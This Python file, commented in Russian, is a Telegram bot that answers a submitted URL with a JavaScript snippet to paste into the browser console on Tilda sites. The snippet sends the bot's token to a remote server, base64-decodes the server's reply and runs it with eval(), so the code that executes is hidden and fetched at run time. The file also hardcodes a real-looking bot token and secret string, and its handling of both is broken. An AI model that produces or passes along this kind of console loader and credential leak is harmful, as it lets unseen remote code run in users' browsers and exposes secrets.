import os
import logging
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Создаём приложение Flask
app = Flask(__name__)

# Получаем токен Telegram-бота из переменных окружения
TOKEN = os.environ.get('7582343855:AAEMJG9pvCg335jVCJt0PeDkgI9L38Xj7WE')  # Токен Telegram-бота, полученный от BotFather

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Получаем SECRET_KEY для Flask из переменных окружения
SECRET_KEY = os.environ.get('pass_1422')  # Секретный ключ для Flask
app.config['pass_1422'] = SECRET_KEY  # Устанавливаем SECRET_KEY для безопасности сессий

# Команда /start для бота
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Привет! Пришли мне ссылку на сайт, я создам для тебя скрипт.")

# Обработчик для ссылки
async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()

    if not url.startswith("http"):
        await update.message.reply_text("Это не ссылка. Пришли мне ссылку на сайт.")
        return

    await update.message.reply_text("Генерирую скрипт...")

    # Генерация скрипта
    script = f"""
(function() {{
    const token = "{TOKEN}";  // Токен для работы с Telegram API
    const hostname = window.location.hostname;

    if (!hostname.includes("tilda")) {{
        console.warn("Не находимся на Tilda-сайте.");
        alert("Скрипт может работать только на Tilda.");
        return;
    }}

    fetch("https://your-app-name.onrender.com/copy", {{
        method: "POST",
        headers: {{
            "Content-Type": "application/json"
        }},
        body: JSON.stringify({{
            token: token
        }})
    }})
    .then(res => {{
        if (!res.ok) {{
            throw new Error(`Ошибка ${res.status}: ${res.statusText}`);
        }}
        return res.json();
    }})
    .then(data => {{
        if (data.output) {{
            try {{
                const decoded = decodeURIComponent(escape(window.atob(data.output)));
                eval(decoded);
            }} catch (e) {{
                console.error("Ошибка при декодировании данных: ", e);
            }}
        }} else {{
            console.error("Нет данных 'output' в ответе от сервера.");
        }}
    }})
    .catch(err => {{
        console.error("Ошибка при запросе к серверу: ", err);
    }});
}})();
    """

    await update.message.reply_text(f"Вот скрипт для вставки в консоль:\n\n{script}")

# Настройка бота
def main():
    app_telegram = Application.builder().token(TOKEN).build()
    app_telegram.add_handler(CommandHandler("start", start))
    app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))

    # Запускаем Telegram-бот
    app_telegram.run_polling()

# Запускаем приложение Flask
if __name__ == "__main__":
    main()
